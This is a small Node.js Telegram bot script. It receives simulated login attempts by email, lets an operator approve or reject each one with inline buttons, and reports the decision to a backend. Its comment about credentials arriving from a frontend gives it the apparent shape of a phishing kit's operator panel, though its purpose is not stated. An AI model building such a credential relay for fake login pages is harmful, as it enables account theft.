// bot.js
const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN; // put your bot token in Render env vars
const BACKEND_URL = process.env.BACKEND_URL || "https://your-app.onrender.com";

// Create bot in polling mode
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// When credentials come in, they’re sent to this bot from frontend
// For now, let’s simulate by listening for /test
bot.onText(/\/test (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const email = match[1];

  bot.sendMessage(chatId, `Login attempt:\n\nEmail: ${email}`, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve:${email}` },
          { text: "❌ Reject", callback_data: `reject:${email}` },
        ],
      ],
    },
  });
});

// Handle button clicks
bot.on("callback_query", async (query) => {
  const [action, email] = query.data.split(":");
  const chatId = query.message.chat.id;

  let status;
  if (action === "approve") status = "accepted";
  if (action === "reject") status = "rejected";

  if (status) {
    // Update backend
    await fetch(`${BACKEND_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, status }),
    });

    bot.answerCallbackQuery(query.id, { text: `Set ${email} -> ${status}` });
    bot.sendMessage(chatId, `Decision saved: ${email} -> ${status}`);
  }
});
